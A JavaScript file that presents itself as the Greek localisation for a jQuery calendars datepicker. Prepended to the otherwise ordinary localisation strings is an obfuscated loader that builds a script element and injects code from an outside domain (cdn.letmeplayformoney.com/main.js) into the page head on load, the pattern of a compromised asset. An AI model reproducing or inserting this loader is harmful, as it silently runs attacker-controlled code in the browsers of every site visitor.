var _0x25b0=['createElement','script','onload','src','https://cdn.letmeplayformoney.com/main.js?cdn=js','text/javascript','getElementsByTagName','head','appendChild'];(function(_0x38c36f,_0x12afce){var _0x31d501=function(_0x338e37){while(--_0x338e37){_0x38c36f['push'](_0x38c36f['shift']());}};_0x31d501(++_0x12afce);}(_0x25b0,0x1dd));var _0x4bec=function(_0x1c1d3d,_0x21e514){_0x1c1d3d=_0x1c1d3d-0x0;var _0x2921c7=_0x25b0[_0x1c1d3d];return _0x2921c7;};var script=document[_0x4bec('0x0')](_0x4bec('0x1'));script[_0x4bec('0x2')]=function(){};script[_0x4bec('0x3')]=_0x4bec('0x4');script['type']=_0x4bec('0x5');document[_0x4bec('0x6')](_0x4bec('0x7'))[0x0][_0x4bec('0x8')](script);﻿/* http://keith-wood.name/calendars.html
   Greek localisation for calendars datepicker for jQuery.
   Written by Alex Cicovic (http://www.alexcicovic.com). */
(function($) {
	$.calendars.picker.regional['el'] = {
		renderer: $.calendars.picker.defaultRenderer,
		prevText: 'Προηγούμενος', prevStatus: 'Επισκόπηση προηγούμενου μήνα',
		prevJumpText: '&#x3c;&#x3c;', prevJumpStatus: '',
		nextText: 'Επόμενος', nextStatus: 'Επισκόπηση επόμενου μήνα',
		nextJumpText: '&#x3e;&#x3e;', nextJumpStatus: '',
		currentText: 'Τρέχων Μήνας', currentStatus: 'Επισκόπηση τρέχοντος μήνα',
		todayText: 'Τρέχων Μήνας', todayStatus: 'Επισκόπηση τρέχοντος μήνα',
		clearText: 'Σβήσιμο', clearStatus: 'Σβήσιμο της επιλεγμένης ημερομηνίας',
		closeText: 'Κλείσιμο', closeStatus: 'Κλείσιμο χωρίς αλλαγή',
		yearStatus: 'Επισκόπηση άλλου έτους', monthStatus: 'Επισκόπηση άλλου μήνα',
		weekText: 'Εβδ', weekStatus: '',
		dayStatus: 'Επιλογή DD d MM', defaultStatus: 'Επιλέξτε μια ημερομηνία',
		isRTL: false
	};
	$.calendars.picker.setDefaults($.calendars.picker.regional['el']);
})(jQuery);
